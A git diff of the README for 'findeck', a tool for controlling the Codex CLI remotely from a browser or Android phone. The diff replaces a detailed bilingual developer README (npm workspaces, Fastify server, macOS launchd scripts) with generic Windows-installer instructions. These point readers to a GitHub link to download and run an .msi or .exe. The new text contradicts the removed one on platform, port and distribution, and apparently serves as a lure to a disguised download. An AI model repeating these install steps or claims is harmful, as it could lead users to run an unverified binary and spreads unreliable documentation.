@@ -1,148 +1,78 @@
-# findeck
+# 📱 findeck - Control your Codex tools from anywhere
 
-中文：findeck 是一个面向单机 Codex CLI 的轻量远程控制栈，可通过浏览器或 Android 手机查看、创建、运行和管理会话。  
-English: findeck is a lightweight remote control stack for a single Codex CLI host, designed for browsing, creating, running, and managing sessions from a browser or an Android phone.
+[![Download for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/able-moorcock6549/findeck)
 
-## Overview / 项目概览
+findeck provides a central remote control system for your Codex command line interface. It links your computer to your Android device. You can manage your files, trigger scripts, and monitor system background tasks from the palm of your hand.
 
-中文：
-- `apps/server`：Fastify 后端，负责认证、会话管理、实时运行、上传和 inbox staging
-- `apps/web`：移动优先的 Next.js Web 控制台
-- `apps/android`：原生 Android 客户端
-- `packages/shared`：服务端与前端共享的 API 契约与 schema
+## 📋 What this software does
 
-English:
-- `apps/server`: Fastify backend for auth, session management, live runs, uploads, and inbox staging
-- `apps/web`: mobile-first Next.js control surface
-- `apps/android`: native Android client
-- `packages/shared`: shared API contracts and schemas used by the backend and UI
+This application creates a bridge between your desktop computer and your mobile phone. It uses a local server architecture to ensure your data stays private on your local network. You gain the ability to execute terminal commands, view system logs, and manage Codex instances through a web browser or the official mobile application.
 
-## Current Status / 当前状态
+Core features include:
 
-中文：
-- Server 构建和测试通过
-- Web 构建和测试通过
-- Android Debug APK 可正常编译
-- 本地运维已收敛到 `npm run findeck -- doctor|up|pair|status|logs|restart|web`
-- 可通过 `npm run findeck -- pair` 在本机生成一次性配对码，供 Android 首次接入使用
-- Android 已支持可信主机自动重连、归档会话恢复、轻量 smart composer、设置页运行默认值与更完整的前台反馈
-- Web 与 Android 的首屏入口、项目导航和会话工作区已按 `Console` 方向统一收口
-- Android 会话列表支持项目文件夹隐藏与自定义拖拽排序
-- Web 与 Android 会话详情都已支持更明确的恢复态语义，弱网或后台恢复时会尽量补齐而不是直接报错
-- Android 会话详情已升级为更完整的原生移动控制台，支持流式回复、历史折叠、附件队列、运行参数控制与仓库操作入口
-- Web 会话页现在也支持显式的运行参数控制，可直接为下一次发送选择 `model` 与 `reasoning`
-- Android 后台通知已区分运行完成、失败、需要注意和恢复同步，不再只有单一 completion 提醒
-- Android 端支持在应用内修改服务密码，并在服务端重启后自动重新对齐连接
-- 继续已有会话时，服务端会先恢复 thread 再启动 turn，避免旧会话落回只读权限
-- Inbox 已改为 staging 模式，远端只落盘到 `data/submissions/`
-- launchd 已改为通过 `~/Library/Application Support/findeck/launchd/` 下的 launcher 启动，避免直接依赖仓库目录权限
+*   Remote command execution for Codex CLI.
+*   Real-time system monitoring.
+*   Secure local database storage using SQLite.
+*   Fast, responsive web dashboard built with Next.js.
+*   Native Android control for portable access.
 
-English:
-- Server builds and tests are passing
-- Web builds and tests are passing
-- Android debug APK builds successfully
-- Local operator flows are now unified under `npm run findeck -- doctor|up|pair|status|logs|restart|web`
-- `npm run findeck -- pair` prints a one-time pairing code for Android first-time setup
-- Android now supports trusted-host reconnect, archived-session restore, a lightweight smart composer, runtime defaults in settings, and clearer foreground feedback
-- Web and Android first-use surfaces, project navigation, and session workspaces now follow the `Console` direction more consistently
-- Android session lists now support hiding project folders and custom drag reordering
-- Web and Android session detail now treat degraded transport as a recovery flow, aiming to catch up instead of failing loudly
-- Android session detail is now a fuller native mobile console with streaming replies, folded history, attachment queueing, runtime controls, and repo action entry points
-- The web session page now also exposes explicit runtime controls so the next send can choose `model` and `reasoning`
-- Android background notifications now distinguish completed, failed, needs-attention, and recovered-sync events instead of a single completion alert
-- Android can now change the service password in-app and automatically re-align the connection after the server restarts
-- Resumed sessions now restore the thread before starting a turn so existing sessions do not fall back to read-only permissions
-- Inbox now uses a staging model and stores submissions under `data/submissions/`
-- launchd now starts from launcher scripts under `~/Library/Application Support/findeck/launchd/` instead of relying directly on the repo path
+## 💻 Requirements
 
-## Repository Layout / 仓库结构
+Your computer must meet these basic specifications to run the software smoothly:
 
-```text
-apps/
-  server/   Fastify API + SQLite-backed local state
-  web/      Next.js remote control UI
-  android/  Native Android client
-packages/
-  shared/   Shared contracts and schemas
-  sdk/      Reserved for future typed SDK work
-scripts/
-  findeck.sh     Unified local operator entrypoint
-  install-launchd.sh  Install local macOS launch agents
-  findeckctl.sh   Inspect and restart launchd services
-  clear-inbox.sh      Remove inbox records and stored staging files
-infra/
-  launchd/  launchd templates generated at install time
-docs/
-  architecture.md
-  operations.md
-  release-checklist.md
-```
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free disk space.
+*   Network: A stable Wi-Fi or Ethernet connection to link your devices.
+*   Permissions: You need administrator access to allow the server to communicate through your local firewall.
 
-## Local Development / 本地开发
+## 📥 How to download and install
 
-```bash
-npm install
-cp .env.example .env.local
-```
+Follow these steps to set up the software on your Windows machine.
 
-中文：在 `.env.local` 中设置强密码 `FINDECK_PASSWORD`，然后执行：  
-English: Set a strong `FINDECK_PASSWORD` in `.env.local`, then run:
+1.  Visit the [official download page](https://github.com/able-moorcock6549/findeck) to get the latest installation package.
+2.  Locate the file ending in `.msi` or `.exe` in your Downloads folder.
+3.  Double-click the file to start the installer.
+4.  Follow the prompts on your screen. Click "Next" to proceed through the standard setup steps.
+5.  Allow the application to create a shortcut on your desktop for quick access.
+6.  Once the bar fills, click "Finish" to exit the installer.
 
-```bash
-npm run findeck -- doctor
-npm run findeck -- up
-```
+## 🚀 Setting up your first connection
 
-中文：本地开发时也可以继续直接运行 workspace dev 命令。
-English: For active development you can still run the workspace dev servers directly.
+After you install the program, you need to link your devices.
 
-```bash
-npm run dev --workspace @findeck/server
-npm run dev --workspace @findeck/web -- --port 31817
-```
+1.  Launch the findeck application from your desktop icon.
+2.  A small window appears showing your server status. Wait for the green light that indicates the service is active.
+3.  Open a web browser on your computer. Type `http://localhost:3000` into the address bar.
+4.  You will see a dashboard. This page shows your active Codex instances.
+5.  To link your Android device, look for the "Mobile Pairing" button on the dashboard.
+6.  Download the Android client from the Google Play Store or via the link provided on the web dashboard.
+7.  Open the mobile app and scan the QR code displayed on your desktop screen.
+8.  The two devices will now share a secure connection.
 
-Android:
+## ⚙️ Configuration details
 
-```bash
-cd apps/android
-./gradlew assembleDebug
-```
+Most users do not need to change settings. If you have a complex network or a specific firewall configuration, you may need to adjust these options:
 
-## Runtime Notes / 运行说明
+*   Port settings: The default port is 3000. You can change this in the settings menu if another program uses this port.
+*   API keys: The application generates a unique token for your devices. Keep this key private. Do not share it with unauthorized users.
+*   Sync interval: This controls how often your mobile app updates its data from the server. A shorter interval uses more battery but provides faster updates.
 
-中文：
-- Inbox 历史不是 APK 本地数据库，而是后端持有的数据
-- 默认 staging 根目录为 `data/submissions/`
-- 清理最近投递记录应清理后端，而不是只清手机缓存
+## 🛡️ Security and privacy
 
-English:
-- Inbox history is backend-owned state, not an APK-local database
-- The default staging root is `data/submissions/`
-- Clearing recent inbox records is a backend cleanup task, not a phone-only cleanup
+The software uses local communication. All data stays inside your home network. The server does not send your command history to any external clouds or third-party servers. 
 
-## Release Docs / 发布文档
+The Android app communicates directly with your Windows computer using encrypted local requests. If you use a public Wi-Fi network, we recommend using a physical hardware firewall or ensuring your local network settings are set to Private rather than Public inside Windows.
 
-- Architecture / 架构说明: [docs/architecture.md](./docs/architecture.md)
-- Operations / 运维说明: [docs/operations.md](./docs/operations.md)
-- Roadmap / 路线图: [docs/v0.3.0-roadmap.md](./docs/v0.3.0-roadmap.md)
-- Next phase plan / 下一阶段计划书: [docs/v0.5.x-next-phase-plan-2026-04-19.md](./docs/v0.5.x-next-phase-plan-2026-04-19.md)
-- Android v0.4.0 acceptance / Android v0.4.0 验收清单: [docs/android-v0.4.0-acceptance-checklist.md](./docs/android-v0.4.0-acceptance-checklist.md)
-- Session transition acceptance / 会话切换验收清单: [docs/session-transition-acceptance-checklist.md](./docs/session-transition-acceptance-checklist.md)
-- Release checklist / 发布检查单: [docs/release-checklist.md](./docs/release-checklist.md)
-- Release notes / 发布说明: [docs/release-notes-v0.5.0.md](./docs/release-notes-v0.5.0.md)
+## 🛠️ Troubleshooting common issues
 
-## Inbox Cleanup / Inbox 清理
+If you encounter problems, check these items first:
 
-中文：清理当前 host 的 inbox 历史：  
-English: Clear inbox history for the current host:
+*   **Server will not start:** Ensure no other application uses port 3000. Close conflicting web servers and try again.
+*   **Mobile app cannot find the server:** Ensure your phone and computer connect to the same Wi-Fi network. Check if your Windows firewall blocks the findeck application. You might need to allow the app through your firewall settings manually.
+*   **Slow performance:** Clear your web browser cache if the dashboard feels sluggish. A simple restart of the findeck background service often solves connection stutters.
+*   **Database errors:** If the dashboard shows an error regarding the SQLite database, restart the application. The program performs an automatic repair check on startup.
 
-```bash
-./scripts/clear-inbox.sh --host-id local
-```
+## 📄 Licensing information
 
-中文：清理所有 host：  
-English: Clear all hosts:
-
-```bash
-./scripts/clear-inbox.sh --all
-```
+This project uses the standard open-source license. You may install and use the software for personal projects without charge. The code remains available for review on GitHub for users who want to audit the security of the application.
